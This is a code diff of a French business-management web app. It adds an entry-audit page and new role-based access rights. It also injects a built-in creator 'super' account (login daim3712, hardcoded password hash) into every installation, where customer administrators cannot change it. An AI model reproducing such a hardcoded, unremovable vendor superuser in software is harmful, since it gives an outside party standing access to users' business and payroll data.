@@ -364,10 +364,10 @@ const IC = {
   wus:'<path d="M3 21h18M5 21V10l7-6 7 6v11M9 21v-6h6v6M9 11h.01M15 11h.01"/>',
   par:'<circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M4.2 4.2l2.1 2.1M17.7 17.7l2.1 2.1M2 12h3M19 12h3M4.2 19.8l2.1-2.1M17.7 6.3l2.1-2.1"/>'
 };
-const NAV = [['menu','Menu principal','menu'],['home','Accueil','home'],['facture','Facture','fac'],['registre','Registre','reg'],['charges','Charges','chg'],['employes','Employés','emp'],['paie','Paie','pay'],['pdg','PDG','pdg'],['compte','Compte SNI','rap'],['tracto','Tractopelle','trc'],['wusu','Wusukani Wamasiwa','wus'],['param','Paramètres','par']];
+const NAV = [['menu','Menu principal','menu'],['home','Accueil','home'],['facture','Facture','fac'],['registre','Registre','reg'],['journal','Journal des saisies','reg'],['charges','Charges','chg'],['employes','Employés','emp'],['paie','Paie','pay'],['pdg','PDG','pdg'],['compte','Compte SNI','rap'],['tracto','Tractopelle','trc'],['wusu','Wusukani Wamasiwa','wus'],['param','Paramètres','par']];
 const svg = k => `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${IC[k]}</svg>`;
 let view = 'menu';
-const VERSION_APP='2.0.98';
+const VERSION_APP='2.0.99';
 /* Créateur du logiciel : coordonnées fixes, intégrées au code (identiques dans chaque installation, non modifiables) */
 const CREATEUR={nom:'ALI DAÏM',email:'daim3575@gmail.com',tels:['+269 323 05 70','+269 432 29 14']};
 const waLien=t=>'https://wa.me/'+t.replace(/\D/g,'');
@@ -408,7 +408,7 @@ async function actualiser(){
   }catch(e){ toast('Actualisation impossible : '+String(e&&e.message||e).slice(0,80)); }
   finally{ actuEnCours=false; }
 }
-function go(v){ if(LOCKED) return; if(!autorise(v)) v='facture'; view=v; if(v==='facture' && !draft) newDraft(); drawNav(); render(); window.scrollTo(0,0); signalerAppareil(); }
+function go(v){ if(LOCKED) return; if(!autorise(v)) v=vueDefaut(); view=v; if(v==='facture' && !draft) newDraft(); drawNav(); render(); window.scrollTo(0,0); signalerAppareil(); }
 
 /* ============ Outils ============ */
 const h = s => String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
@@ -861,8 +861,8 @@ function detailResultatHTML(R,titre,mD){
 function render(){
   const m=document.getElementById('main');
   if(LOCKED){ vLogin(m); return; }
-  if(!autorise(view)){ view='facture'; if(!draft) newDraft(); }
-  ({menu:vMenu,home:vHome,facture:vFacture,registre:vRegistre,charges:vCharges,employes:vEmployes,paie:vPaie,pdg:vPdg,compte:vCompteSni,tracto:vTracto,wusu:vWusu,rapports:vRapports,param:vParam})[view](m);
+  if(!autorise(view)){ view=vueDefaut(); if(view==='facture'&&!draft) newDraft(); }
+  ({menu:vMenu,home:vHome,facture:vFacture,registre:vRegistre,journal:vJournal,charges:vCharges,employes:vEmployes,paie:vPaie,pdg:vPdg,compte:vCompteSni,tracto:vTracto,wusu:vWusu,rapports:vRapports,param:vParam})[view](m);
   try{ outilsCartes(); }catch(e){}
 }
 
@@ -4368,6 +4368,17 @@ function theme(t){ if(t) document.documentElement.setAttribute('data-theme',t); 
 const JKEY='sni_journal';
 function journal(action,qui){ const u=qui||(USER&&USER.nom)||'—'; try{ const L=JSON.parse(localStorage.getItem(JKEY)||'[]'); L.unshift({d:new Date().toISOString(),u,a:action}); localStorage.setItem(JKEY,JSON.stringify(L.slice(0,300))); }catch(e){} if(ALERTE_RE.test(action)) alerteMail(action,u); }
 const lireJournal=()=>{ try{ return JSON.parse(localStorage.getItem(JKEY)||'[]'); }catch(e){ return []; } };
+/* Page « Journal des saisies » (administrateur et chef de service) : chaque saisie, qui l'a faite et quand */
+let jsQ='', jsU='';
+function vJournal(m){
+  const T=lireJournal(), U=[...new Set(T.map(x=>x.u).filter(Boolean))].sort();
+  const L=T.filter(x=>(!jsU||x.u===jsU)&&(!jsQ||sansAcc([x.u,x.a].join(' ')).includes(sansAcc(jsQ))));
+  m.innerHTML=`<div class="head"><div><h1>Journal des saisies</h1><p>Toutes les saisies faites dans le logiciel sur cet appareil : factures, dépenses, paiements, comptes… avec la personne et l’heure (300 dernières)</p></div></div>
+  <div class="card"><div class="row" style="margin-bottom:.8rem"><label class="f">Rechercher<input value="${h(jsQ)}" placeholder="Ex. : facture, dépense, nom…" onchange="jsQ=this.value.trim();render()"></label>
+    <label class="f" style="flex:0 0 240px">Personne<select onchange="jsU=this.value;render()"><option value="">Tout le monde</option>${U.map(u=>`<option ${u===jsU?'selected':''}>${h(u)}</option>`).join('')}</select></label></div>
+  ${L.length?`<div class="scroll"><table><thead><tr><th>Date et heure</th><th>Personne</th><th>Saisie</th></tr></thead><tbody>${L.map(x=>`<tr><td style="white-space:nowrap">${dt(x.d)}</td><td><b>${h(x.u)}</b></td><td>${h(x.a)}</td></tr>`).join('')}</tbody></table></div>
+    <p class="muted" style="margin-bottom:0">${L.length} saisie${L.length>1?'s':''}</p>`:'<div class="empty">Aucune saisie pour le moment.</div>'}</div>`;
+}
 /* Code secret de suppression (4 chiffres) : demandé avant toute suppression ou tout vidage.
    Gardé chiffré dans les paramètres (le même sur le PC et le téléphone par la synchronisation). 5 erreurs = blocage 5 minutes. */
 /* Deux codes : g = code général (charges, PDG, caisses…), f = code secret réservé à la suppression des factures */
@@ -4451,9 +4462,7 @@ function securiteCard(){
   if(!COMPTES().length||!isAdmin()) return '';
   const J=lireJournal().slice(0,40), min=+(S.verrou??10);
   return `<div class="card"><h2>Sécurité administrateur</h2>
-    <div class="row"><label class="f" style="max-width:320px">Connexion à l’ouverture<select onchange="setConnexion(this.value)"><option value="1" ${connOff()?'':'selected'}>Activée : identifiant et mot de passe demandés</option><option value="0" ${connOff()?'selected':''}>Désactivée : ouverture directe en administrateur</option></select></label>
-      <label class="f" style="max-width:320px">Qui peut ouvrir le logiciel<select onchange="setAdminSeul(this.value)"><option value="1" ${adminSeul()?'selected':''}>Administrateur seulement</option><option value="0" ${adminSeul()?'':'selected'}>Tous les comptes (agents, employés)</option></select></label>
-      <label class="f" style="max-width:320px">Verrouillage automatique sans activité<select onchange="setVerrou(this.value)">${[[5,'Après 5 minutes'],[10,'Après 10 minutes'],[15,'Après 15 minutes'],[30,'Après 30 minutes'],[60,'Après 1 heure'],[0,'Jamais']].map(([v,t])=>`<option value="${v}" ${min===v?'selected':''}>${t}</option>`).join('')}</select></label></div>
+    <div class="row"><label class="f" style="max-width:320px">Verrouillage automatique sans activité<select onchange="setVerrou(this.value)">${[[5,'Après 5 minutes'],[10,'Après 10 minutes'],[15,'Après 15 minutes'],[30,'Après 30 minutes'],[60,'Après 1 heure'],[0,'Jamais']].map(([v,t])=>`<option value="${v}" ${min===v?'selected':''}>${t}</option>`).join('')}</select></label></div>
     <p class="muted">Protégé par le code administrateur : suppression de facture, remise à zéro, restauration de sauvegarde, retrait de l’import Excel, gestion des comptes. Après 5 codes faux, l’accès est bloqué, et le blocage s’allonge à chaque nouvelle série d’erreurs.</p>
     ${mailCard()}
     <h3 style="margin:1rem 0 .4rem">Journal de sécurité (40 derniers événements)</h3>
@@ -4465,29 +4474,38 @@ const BLK='sni_blocage';
 const lireBlocage=()=>{ try{ return JSON.parse(localStorage.getItem(BLK)||'{}'); }catch(e){ return {}; } };
 const ecrireBlocage=o=>{ try{ localStorage.setItem(BLK,JSON.stringify(o)); }catch(e){} };
 let USER=null, LOCKED=false, impPar='', essais=0, bloqueJusqu=0;
-const COMPTES=()=>S.comptes||[];
+/* Administrateur du créateur, intégré au logiciel : présent sur tout appareil dès l'installation (identifiant daim3712).
+   Seul le mot de passe chiffré est gardé ici ; une fois changé par le créateur, le nouveau mot de passe remplace celui-ci. */
+const CREATEUR_ID='createur-daim3712';
+const CREATEUR_DEF=()=>({id:CREATEUR_ID,nom:CREATEUR.nom,role:'super',login:'daim3712',email:CREATEUR.email,integre:true,cree:'2026-11-11T00:00:00.000Z',pin:'76fad53503cbd0d1c4c8022ca6dc66121bc4377eff0488de164a353a96babc4c'});
+const COMPTES=()=>{ const L=S.comptes||[]; if(!L.some(c=>c.id===CREATEUR_ID)) S.comptes=[CREATEUR_DEF(),...L]; return S.comptes; };
 /* Le super administrateur (développeur / secours) a tous les droits d'un administrateur ; lui seul peut modifier son propre compte */
 const estAdmin=c=>!!c&&(c.role==='admin'||c.role==='super');
 const isAdmin=()=>!USER||estAdmin(USER);
 const superProtege=c=>c&&c.role==='super'&&!(USER&&USER.id===c.id);
-const ROLES={super:'Super administrateur (développeur, secours)',admin:'Administrateur (tout)',agent:'Agent (factures et charges)',employe:'Employé (factures seulement)'};
-const roleCourt=r=>({super:'Super administrateur',admin:'Administrateur',agent:'Agent',employe:'Employé'})[r]||'Employé';
+const ROLES={super:'Administrateur (créateur du logiciel – voit tout)',admin:'Administrateur (tout)',pdg:'PDG (ses propres transactions seulement)',chef:'Chef de service (factures, journal des saisies, registre)',agent:'Agent (factures seulement)',employe:'Agent (factures seulement)'};
+const roleCourt=r=>({super:'Administrateur',admin:'Administrateur',pdg:'PDG',chef:'Chef de service',agent:'Agent',employe:'Agent'})[r]||'Agent';
+/* Ce que chaque compte peut voir. L'administrateur voit tout. */
+const DROITS={pdg:['menu','pdg'],chef:['menu','facture','registre','journal'],agent:['menu','facture'],employe:['menu','facture']};
+const vueDefaut=()=>autorise('facture')?'facture':'pdg';
 const idCompte=c=>(c.login||c.nom||'').trim();
-const adminSeul=()=>S.adminSeul!==false;
+const adminSeul=()=>false; /* chaque compte créé par l'administrateur peut se connecter, avec seulement ses droits */
 const trouverCompte=t=>{ t=String(t||'').trim().toLowerCase(); return COMPTES().find(c=>idCompte(c).toLowerCase()===t)||COMPTES().find(c=>(c.email||'').trim().toLowerCase()===t&&t)||COMPTES().find(c=>(c.nom||'').trim().toLowerCase()===t); };
-const autorise=v=>isAdmin()||v==='facture'||v==='menu'||(USER&&USER.role==='agent'&&v==='charges');
+const autorise=v=>isAdmin()||(DROITS[USER&&USER.role]||DROITS.agent).includes(v);
 const auj=()=>{ const d=new Date(); return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate()); };
 async function hashPin(id,pin){ const t='sni|'+id+'|'+pin;
   try{ const b=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(t)); return [...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join(''); }
   catch(e){ let x=5381; for(const ch of t) x=((x*33)^ch.charCodeAt(0))>>>0; return 'f'+x.toString(16); } }
 /* Sécurité : à chaque ouverture, l'identifiant et le mot de passe de l'administrateur sont demandés */
-const connOff=()=>S.connexionOff===true;
-function ouvrirSession(){ if(S.connOffV!==5){ S.connexionOff=false; S.adminSeul=true; S.connOffV=5; try{ saveSettings().catch(()=>{}); }catch(e){} }
+/* La connexion est toujours obligatoire : seuls les comptes créés par l'administrateur peuvent ouvrir le logiciel */
+const connOff=()=>false;
+function ouvrirSession(){ const neuf=!(S.comptes||[]).some(c=>c.id===CREATEUR_ID); COMPTES();
+  if(S.connOffV!==6||neuf){ S.connexionOff=false; S.adminSeul=false; S.connOffV=6; try{ saveSettings().catch(()=>{}); }catch(e){} }
   const L=COMPTES(); if(!L.length){ USER=null; LOCKED=!connOff(); return; }
   if(connOff()){ let id=''; try{ id=sessionStorage.getItem('sni_user')||''; }catch(e){} USER=L.find(c=>c.id===id)||L.find(c=>c.role==='admin')||L[0]; LOCKED=false; impPar=USER.nom; return; }
   let id=''; try{ id=sessionStorage.getItem('sni_user')||''; }catch(e){} USER=L.find(c=>c.id===id)||null; LOCKED=!USER; if(USER) impPar=USER.nom; }
 /* ============ Menu principal ============ */
-const MENU_DESC={home:'Tableau de bord et bilan du mois',facture:'Créer une facture proforma ou définitive',registre:'Toutes les factures et les reçus',charges:'Dépenses fixes et variables',employes:'Fiches des employés',paie:'Bulletins de paye du mois',pdg:'',compte:'Tableau de compte SNI de fin de mois',tracto:'Heures de travail, clients, paie du chauffeur',wusu:'Ventes, dépenses et compte à part',rapports:'Bilans, journalier, statistiques',param:'Identité, comptes, sécurité, sauvegarde'};
+const MENU_DESC={home:'Tableau de bord et bilan du mois',facture:'Créer une facture proforma ou définitive',registre:'Toutes les factures et les reçus',journal:'Qui a saisi quoi, et quand',charges:'Dépenses fixes et variables',employes:'Fiches des employés',paie:'Bulletins de paye du mois',pdg:'',compte:'Tableau de compte SNI de fin de mois',tracto:'Heures de travail, clients, paie du chauffeur',wusu:'Ventes, dépenses et compte à part',rapports:'Bilans, journalier, statistiques',param:'Identité, comptes, sécurité, sauvegarde'};
 function menuChiffre(k){
   const now=ymNow(), st=stats(now);
   try{ switch(k){
@@ -4586,20 +4604,19 @@ async function codeOublie(){
 /* Écran d'ouverture : identifiant et mot de passe d'un compte déjà créé ; en bas, l'inscription */
 let ECRAN='connexion';
 function vLogin(m){
-  if(ECRAN==='inscription'){ vInscription(m); return; }
+  ECRAN='connexion'; /* plus d'inscription : seul l'administrateur crée les comptes */
   const aucun=!COMPTES().length;
   m.innerHTML=`<div class="fondOuv"></div><div class="card login"><img src="${IMG.logo||LOGO_SNI}" alt="Logo"><h1 style="margin:.2rem 0 1rem">Connexion</h1>
     <label class="f" style="text-align:left">Identifiant<input id="lg_u" autocomplete="username" autocapitalize="none" spellcheck="false" onkeydown="if(event.key==='Enter')document.getElementById('lg_p').focus()"></label>
     <label class="f" style="margin-top:.7rem;text-align:left">Mot de passe<input id="lg_p" type="password" autocomplete="current-password" onkeydown="if(event.key==='Enter')connexion()"></label>
     <button class="btn pri" style="margin-top:1rem;width:100%" onclick="connexion()">Se connecter</button>
     <p style="margin:.8rem 0 0;text-align:center;font-size:.9rem"><a href="#" id="lienOubli" style="color:var(--muted)" onclick="motDePasseOublie();return false">Mot de passe oublié ?</a></p>
-    <div style="border-top:1px solid var(--line);margin-top:1rem;padding-top:1rem;text-align:center">${aucun?'<b>Aucun compte pour le moment.</b><br>':'Pas encore de compte ?<br>'}
-      <button class="btn" id="lienInscription" style="margin-top:.5rem;width:100%" onclick="ECRAN='inscription';render()">Inscription</button></div>
+    <p class="muted" style="border-top:1px solid var(--line);margin:1rem 0 0;padding-top:.8rem;text-align:center;font-size:.85rem">Pas de compte ? Seul l’administrateur peut créer un compte : demandez-le-lui.</p>
     <div id="majBar" style="margin-top:1rem;padding:.6rem .8rem;border-radius:8px;text-align:center;font-size:.9rem;${majDispo()?'background:var(--paid-soft);border:1px solid var(--paid)':'background:var(--bg)'}">
       ${majDispo()?`<b style="color:var(--paid)">Nouvelle version ${h(MAJ_EN_LIGNE.version)} disponible</b><br><button class="btn sm pri" style="margin-top:.4rem" onclick="ouvrirMaj()">Mettre à jour</button>`
         :`Version ${VERSION_APP} · <a href="#" id="lienMaj" style="color:var(--cyan);font-weight:600" onclick="ouvrirMaj(${FB||MAJ_GH?'true':'false'});return false">Mise à jour</a>`}</div>
     <p class="muted" style="margin:1rem 0 0;font-size:.75rem;text-align:center">Logiciel créé par <b>${CREATEUR.nom}</b> · ${createurLiens()}</p></div>`;
-  setTimeout(()=>{ const p=document.getElementById(aucun?'lienInscription':'lg_u'); if(p) p.focus(); },50);
+  setTimeout(()=>{ const p=document.getElementById('lg_u'); if(p) p.focus(); },50);
 }
 /* Inscription : le premier compte devient l'administrateur ; les suivants attendent la validation de l'administrateur */
 function vInscription(m){
@@ -4690,13 +4707,13 @@ async function refuserInscription(id){
 function comptesCard(){
   const L=COMPTES().filter(c=>!c.attente), moi=c=>USER&&USER.id===c.id;
   return `${demandesCard()}<div class="card"><h2>Comptes et sécurité</h2>
-  <p class="muted" style="margin-top:0">${L.length?'L’application demande l’identifiant et le mot de passe à chaque ouverture. L’administrateur voit tout ; un agent fait les factures et les charges ; un employé fait seulement les factures.':'Aucun compte pour le moment : l’application s’ouvre sans code. Créez d’abord le compte administrateur (le vôtre).'}</p>
+  <p class="muted" style="margin-top:0">${L.length?'L’application demande l’identifiant et le mot de passe à chaque ouverture. <b>Seul l’administrateur voit tout et crée les comptes.</b> Le PDG voit seulement ses propres transactions ; le chef de service fait les factures et voit le journal des saisies et le registre ; l’agent fait seulement les factures.':'Aucun compte pour le moment : l’application s’ouvre sans code. Créez d’abord le compte administrateur (le vôtre).'}</p>
   ${L.length?`<div class="scroll"><table><thead><tr><th>Nom complet</th><th>Identifiant</th><th>Adresse e-mail</th><th>Rôle</th><th></th></tr></thead><tbody>${L.map(c=>`<tr><td><b>${h(c.nom)}</b>${moi(c)?' <span class="muted">(vous)</span>':''}</td><td>${h(idCompte(c))}</td><td>${h(c.email||'—')}</td><td>${ROLES[c.role]||ROLES.employe}</td><td>${superProtege(c)?'<span class="tag conv">Protégé</span>':`<div class="btns"><button class="btn sm" onclick="changerPin('${c.id}')">Changer le mot de passe</button><button class="btn sm" onclick="changerEmail('${c.id}')">E-mail</button>${moi(c)?'':`<button class="btn sm danger" onclick="supprCompte('${c.id}')">Supprimer</button>`}</div>`}</td></tr>`).join('')}</tbody></table></div>`:''}
   ${L.length&&!estCreateur()?`<p class="errs" style="margin:1rem 0 0"><b>Création de comptes réservée au créateur du logiciel</b>Seul ${CREATEUR.nom} (compte « Administrateur spécial ») peut créer un compte ou valider une inscription. Contact : ${createurLiens()}</p>
   <div class="btns" style="margin-top:.8rem">${USER?'<button class="btn" onclick="deconnexion()">Se déconnecter</button>':''}</div></div>`:`
   <h3 style="margin:1rem 0 .4rem">${L.length?'Créer un nouveau compte (administrateur, agent ou employé)':'Créer le compte administrateur'}</h3>
   <div class="row"><label class="f">Nom complet<input id="ac_n" placeholder="Ex. : Ali Said Abdallah"></label><label class="f" style="max-width:260px">Adresse e-mail<input id="ac_e" type="email" placeholder="obligatoire pour un administrateur"></label><label class="f" style="max-width:200px">Identifiant<input id="ac_l" placeholder="Ex. : ali" autocapitalize="none" spellcheck="false"></label>
-    ${L.length?`<label class="f" style="max-width:250px">Rôle<select id="ac_r"><option value="admin">Administrateur (tout)</option><option value="agent">Agent (factures et charges)</option><option value="employe">Employé (factures seulement)</option></select></label>`:''}
+    ${L.length?`<label class="f" style="max-width:320px">Rôle<select id="ac_r"><option value="agent">Agent (factures seulement)</option><option value="chef">Chef de service (factures, journal des saisies, registre)</option><option value="pdg">PDG (ses propres transactions seulement)</option></select></label>`:''}
     <label class="f" style="max-width:180px">Mot de passe (4 à 20 caractères)<input id="ac_p" type="password" autocomplete="new-password"></label>
     <label class="f" style="max-width:180px">Confirmer le mot de passe<input id="ac_p2" type="password" autocomplete="new-password"></label></div>
   <div class="btns" style="margin-top:.8rem"><button class="btn pri" onclick="ajouterCompte()">Créer le compte</button>${USER?'<button class="btn" onclick="deconnexion()">Se déconnecter</button>':''}</div>
